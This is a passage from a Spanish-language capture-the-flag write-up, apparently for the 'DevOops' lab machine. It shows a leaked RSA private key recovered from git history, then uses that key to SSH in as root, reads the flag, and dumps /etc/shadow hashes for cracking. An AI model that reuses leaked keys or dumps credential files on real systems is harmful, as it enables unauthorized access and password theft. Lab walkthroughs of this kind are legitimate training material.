+6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
+8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
+RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
+qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
+T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
 -----END RSA PRIVATE KEY-----
-

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend

diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
new file mode 100644
index 0000000..44c981f
--- /dev/null
+++ b/resources/integration/authcredentials.key
@@ -0,0 +1,28 @@
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
+-----END RSA PRIVATE KEY-----
+

commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:24:30 2018 -0400

    Initial commit

diff --git a/README.md b/README.md
new file mode 100644
index 0000000..fe0a1d0
--- /dev/null
+++ b/README.md
@@ -0,0 +1,3 @@
+glorious blogfeed app will be here. 
+
+TODO This is MVP in progess. Work fast, fail fast. Radical Agile.
```

## Shell as root && root.txt 

Lo que podemos hacer es copiarnos la clave privada de la parte que quito y tratar de ver si podemos acceder como root 

Nos vamos al directorio **/tmp** y quedaría así

```bash
roosa@devoops:/tmp$ chmod 600 id_rsa
roosa@devoops:/tmp$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
roosa@devoops:/tmp$ 
```

Ahora podemos conectarnos por que funciona

```bash
roosa@devoops:/tmp$ ssh -i id_rsa root@localhost
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Fri Sep 23 09:46:30 2022
root@devoops:~# export TERM=xterm
root@devoops:~# 
```

```bash
root@devoops:~# cat root.txt 
65862d7683fe0d32084c657ef866457b
root@devoops:~# 
```

# Hashes para crackear

```bash
root@devoops:~# cat /etc/shadow
root:$6$GPJUCRKo$UlI8QT0C3it3IJs2u3DwNf9tHlMz0Jo.4Obidn8u/3e8Qc9GGQqvZUDi.lj7/TaeK4OOZce2WUAf.Aplshclm1:17616:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
osboxes:$6$gCLT06gi$E2gHnMhqtMXs4svcrtZtE56RZXaudCjiUCiPwrPWuHgykp6VRhiaoFeYU.K9nlvsU/scViSoX6ZKFSwf7dCdt1:17616:0:99999:7:::
git:$6$BaYIX5OI$V8/ON4zqbpYjcpnsrJGfHFPrbyLmNj.FSZ/3Bk0uhNrayPGJvu6IR1uzeeh8hzB98vGS.Tpu/mYvD5fbATVMJ0:17616:0:99999:7:::
roosa:$6$N4OqXtks$xv.BMv9cYUiFk8LdXaLCwe4s33SIo4VmZBvvgdt7KBA/YwxM8F3ayUflTYHva8OuKAuYEcGdvugIT94qPkj9L.:17616:0:99999:7:::
sshd:*:17609:0:99999:7:::
blogfeed:$6$yr5pj75z$aJV9JOuxgybTLDjIe1g9VaH3Nnu1ysl0TYVQq9Jth6aDBf1OQSyXisCZ5YRf2vfVruY9xT.x3nvmGExDDq9c71:17609:0:99999:7:::
root@devoops:~#
```
